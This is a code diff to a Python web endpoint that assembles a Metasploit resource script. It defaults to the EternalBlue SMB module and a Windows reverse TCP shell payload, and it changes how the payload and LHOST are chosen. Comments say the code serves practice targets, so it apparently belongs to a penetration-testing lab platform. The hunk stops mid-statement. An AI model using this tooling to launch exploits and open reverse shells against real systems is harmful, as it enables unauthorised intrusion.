@@ -4303,15 +4303,27 @@ async def exploit_msf(req: ExploitRequest, user=Depends(verify_token)):
     host = _recon_host(req.target) if req.target else req.target
     if not host:
         return {"error": "Target required"}
-    if not req.lhost:
-        return {"error": "LHOST required"}
     module  = req.msf_module  or "exploit/windows/smb/ms17_010_eternalblue"
-    # Auto-detect the right payload for this module
-    payload = await _auto_detect_payload(module, req.msf_payload or "")
+    # Trust the payload the frontend supplied — practice targets ship with a
+    # known-good (module, payload) pair. The previous auto-detect logic
+    # parsed `show payloads` output with a brittle regex and frequently
+    # returned wrong architectures (e.g. aix/ppc for a PHP target), causing
+    # Msf::OptionValidateError. Only auto-detect when the user gave nothing.
+    payload = (req.msf_payload or "").strip()
     if not payload:
-        payload = req.msf_payload or "windows/x64/shell_reverse_tcp"
-    # interact/bind payloads don't use LHOST/LPORT
+        payload = await _auto_detect_payload(module, "")
+    if not payload:
+        # Last-resort default — chosen to match the seeded MSF Module above.
+        payload = "windows/x64/shell_reverse_tcp"
+    # interact/bind/find_tag payloads connect TO the target's open port (or
+    # interact directly with a backdoor) — they don't open a listener on our
+    # side, so LHOST/LPORT are not relevant for them. Setting them in the
+    # batch RC would not break things, but cleaner to skip.
     is_reverse = not any(x in payload for x in ["interact", "bind", "find_tag"])
+    # LHOST only required for reverse-shell payloads — backdoor/interact
+    # payloads (like cmd/unix/interact for vsftpd 2.3.4) don't need it.
+    if is_reverse and not req.lhost:
+        return {"error": "LHOST required for reverse payload " + payload}
     lhost_block = f"set LHOST {req.lhost}\nset LPORT {req.lport}\n" if is_reverse and req.lhost else ""
     rc = (
         f"use {module}\n"
